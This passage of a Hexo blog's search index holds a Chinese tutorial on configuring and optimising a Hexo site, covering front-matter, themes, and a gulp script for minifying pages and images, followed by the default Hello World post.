文件夹中寻找 <code>blog.md</code>，并根据其内容建立文章。</p><ul><li><p>修改参数</p><p>以下是您可以在模版中使用的变量：</p></li></ul><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>layout</td><td>布局</td></tr><tr><td>title</td><td>标题</td></tr><tr><td>date</td><td>文件建立日期</td></tr></tbody></table><h4 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h4><p>就是博文最上方以 <code>---</code> 分隔的那部分。</p><p>默认可以使用的Front-matter：</p><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td><td></td></tr><tr><td><code>title</code></td><td>标题</td><td></td></tr><tr><td><code>date</code></td><td>建立日期</td><td>文件建立日期</td></tr><tr><td><code>updated</code></td><td>更新日期</td><td>文件更新日期</td></tr><tr><td><code>comments</code></td><td>开启文章的评论功能</td><td>true</td></tr><tr><td><code>tags</code></td><td>标签（不适用于分页）</td><td></td></tr><tr><td><code>categories</code></td><td>分类（不适用于分页）</td><td></td></tr><tr><td><code>permalink</code></td><td>覆盖文章网址</td></tr></tbody></table><h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p><a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">hexo主题wiki</a></p><p>可以在<a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">此处</a>寻找自己喜欢的主题下载所有的主题文件，保存到Hexo目录下的<code>themes</code>文件夹下。然后在<code>_config.yml</code>文件中修改：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: http:<span class="comment">//hexo.io/plugins/</span></span><br><span class="line">## Themes: http:<span class="comment">//hexo.io/themes/</span></span><br><span class="line">theme: landscape <span class="comment">//themes文件夹中对应文件夹的名称</span></span><br></pre></td></tr></table></figure><p>然后先执行<code>hexo clean</code>，然后重新<code>hexo g</code>，并且<code>hexo d</code>，很快就能看到新主题的效果了~</p><h2 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h2><ul><li><p><strong>设置「RSS」</strong></p></li><li><p><strong>添加「标签」页面</strong></p></li><li><p><strong>添加「分类」页面</strong></p></li><li><p><strong>设置「字体」</strong></p></li><li><p><strong>设置「代码高亮主题」</strong></p></li><li><p><strong>侧边栏社交链接</strong></p><p>问题：图标哪里找？</p><p>解决：<a href="https://link.juejin.im?target=https%3A%2F%2Ffontawesome.com%2Ficons%3Fd%3Dgallery" target="_blank" rel="noopener">Font Awesome</a></p></li><li><p><strong>开启打赏功能</strong></p><p>问题：微信支付宝二维码不美观，规格不一。</p><p>解决：<a href="https://link.juejin.im?target=https%3A%2F%2Fcli.im%2Fweixin" target="_blank" rel="noopener">在线生成二维码</a></p></li><li><p><strong>设置友情链接</strong></p></li><li><p><strong>添加个人联系方式</strong></p></li><li><p><strong>腾讯公益404页面</strong></p></li><li><p><strong>站点建立时间</strong></p></li><li><p><strong>订阅微信公众号</strong></p></li><li><p><strong>设置「动画效果」</strong></p><p>问题：慢，需要等待 JavaScript 脚本完全加载完毕后才会显示内容。 解决：将主题配置文件<code>_config.yml</code>中，use_motion字段的值设为 <code>false</code> 来关闭动画。</p></li><li><p><strong>设置「背景动画」</strong></p></li><li><p><strong>添加背景图</strong></p></li><li><p><strong>修改Logo字体</strong></p></li><li><p><strong>修改内容区域的宽度</strong></p></li><li><p><strong>网站标题栏背景颜色</strong></p></li><li><p><strong>自定义鼠标样式</strong></p></li><li><p><strong>文章加密访问</strong></p></li><li><p><strong>实现点击出现桃心效果</strong></p></li><li><p><strong>静态资源压缩（博文压缩）</strong></p></li><li><p><strong>修改访问url路径</strong></p></li><li><p><strong>博文置顶</strong></p></li><li><p><strong>在右上角或左上角实现fork me on github</strong></p></li><li><p><strong>主页文章添加边框阴影效果</strong></p></li><li><p><strong>显示当前浏览记录</strong></p></li><li><p><strong>常见分类页</strong></p></li><li><p><strong>加入广告</strong></p></li><li><p><strong>添加萌萌哒</strong></p></li><li><p><strong>搜索功能</strong></p></li><li><p><strong>网易云外链播放器</strong></p></li><li><p><strong><a href="http://www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/" target="_blank" rel="noopener">花里胡哨的玩意儿</a></strong></p></li><li><p><strong>修改作者头像并旋转</strong></p></li><li><p><strong>修改<code></code>代码块自定义样式</strong></p></li><li><p><strong>点击爆炸效果</strong></p></li><li><p><strong>添加萌妹子动图</strong></p></li><li><p><strong>侧栏设置</strong></p></li><li><p><strong>透明背景设置</strong></p></li><li><p><strong>添加阅读全文</strong></p></li><li><p><strong>设置网站缩略图标</strong></p></li><li><p><strong>添加站点访问计数</strong></p></li></ul><p>前几个可参考<a href="http://theme-next.iissnan.com/theme-settings.html#use-bg-animation" target="_blank" rel="noopener">next官方文档配置</a></p><p>（以下用到外部工具）</p><p>评论系统</p><p>数据统计与分析</p><p>内容分享服务</p><p><a href="https://www.jianshu.com/p/44e211829447" target="_blank" rel="noopener">文章加密访问</a></p><p><a href="https://github.com/MikeCoder/hexo-blog-encrypt" target="_blank" rel="noopener">hexo-blog-encrypt</a></p><h2 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a>SEO</h2><p><a href="https://www.jianshu.com/p/0d54a590b81a" target="_blank" rel="noopener">Hexo NexT 主题SEO优化指南</a></p><p>seo这东西是使自己的文章能被百度、谷歌搜录，能被搜索到。</p><p>因为暂时不想被搜到/doge，所有暂不配置</p><h2 id="GitPage-国内优化"><a href="#GitPage-国内优化" class="headerlink" title="GitPage 国内优化"></a>GitPage 国内优化</h2><p>参考大佬的博客：<a href="https://blog.lgf.im/2020/03/speedup-github-page/#" target="_blank" rel="noopener">https://blog.lgf.im/2020/03/speedup-github-page/#</a></p><ul><li><p>对于html/js/css的压缩：gulp</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="comment"># 本机安装</span></span><br><span class="line">$ npm install gulp -g</span><br><span class="line">$ <span class="comment">#为了github Action 和其他CI\CD平台也能进行安装，推荐</span></span><br><span class="line">$ npm install gulp --save-dev</span><br><span class="line">$ <span class="comment"># 安装依赖</span></span><br><span class="line">$ npm install gulp-minify-css \</span><br><span class="line">            gulp-babel \</span><br><span class="line">            gulp-uglify \</span><br><span class="line">            gulp-htmlmin \</span><br><span class="line">            gulp-htmlclean \</span><br><span class="line">            --save-dev</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建配置文件：在博客hexo的根目录下，新建 <code>gulpfile.js</code> 配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> minifycss = <span class="built_in">require</span>(<span class="string">'gulp-minify-css'</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">'gulp-htmlmin'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">'gulp-htmlclean'</span>);</span><br><span class="line"><span class="keyword">var</span> imagemin = <span class="built_in">require</span>(<span class="string">'gulp-imagemin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩css文件</span></span><br><span class="line">gulp.task(<span class="string">'minify-css'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.css'</span>)</span><br><span class="line">  .pipe(minifycss())</span><br><span class="line">  .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩html</span></span><br><span class="line">gulp.task(<span class="string">'minify-html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.html'</span>)</span><br><span class="line">      .pipe(htmlclean())</span><br><span class="line">      .pipe(htmlmin(&#123;</span><br><span class="line">          collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">          collapseBooleanAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeComments: <span class="literal">true</span>,</span><br><span class="line">          removeEmptyAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeScriptTypeAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeStyleLinkTypeAttributes: <span class="literal">true</span>,</span><br><span class="line">          minifyJS: <span class="literal">true</span>,</span><br><span class="line">          minifyCSS: <span class="literal">true</span>,</span><br><span class="line">          minifyURLs: <span class="literal">true</span>,</span><br><span class="line">          ignoreCustomFragments: [ <span class="regexp">/\&#123;\&#123;[\s\S]*?\&#125;\&#125;/</span> ],</span><br><span class="line">      &#125;))</span><br><span class="line">      .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩js文件</span></span><br><span class="line">gulp.task(<span class="string">'minify-js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'./public/**/*.js'</span>,<span class="string">'!./public/js/**/*min.js'</span>])</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩图片</span></span><br><span class="line">gulp.task(<span class="string">'minify-images'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'./public/**/*.png'</span>, <span class="string">'./public/**/*.jpg'</span>, <span class="string">'./public/**/*.gif'</span>, <span class="string">'./public/**/*.svg'</span>])</span><br><span class="line">        .pipe(imagemin(&#123;</span><br><span class="line">           optimizationLevel: <span class="number">5</span>, <span class="comment">//类型：Number  默认：3  取值范围：0-7（优化等级）</span></span><br><span class="line">           progressive: <span class="literal">true</span>, <span class="comment">//类型：Boolean 默认：false 无损压缩jpg图片</span></span><br><span class="line">           interlaced: <span class="literal">false</span>, <span class="comment">//类型：Boolean 默认：false 隔行扫描gif进行渲染</span></span><br><span class="line">           multipass: <span class="literal">false</span>, <span class="comment">//类型：Boolean 默认：false 多次优化svg直到完全优化</span></span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'default'</span>, gulp.series(gulp.parallel(<span class="string">'minify-html'</span>, <span class="string">'minify-css'</span>, <span class="string">'minify-js'</span>, <span class="string">'minify-images'</span>)));</span><br></pre></td></tr></table></figure><p>gulp 压缩完之后快了50%</p></li></ul><ul><li><p>cdn加速<br>我的博客还没应用，先mark一下，可以用jsDelivr进行CDN分发<br>jsDelivr 是一家开源免费CDN，主要是对npm包进行CDN分发<br>绝妙的是它还能对Github和Wordpress进行CDN分发<br>我们可以借助 jsDelivr 的 Github资源分发 服务来对我们博客中的css\js\小图片进行加速</p></li><li><p>加载时文字可见</p></li><li><p>使用懒加载</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/05/13/hello-world/"/>
      <url>/2019/05/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
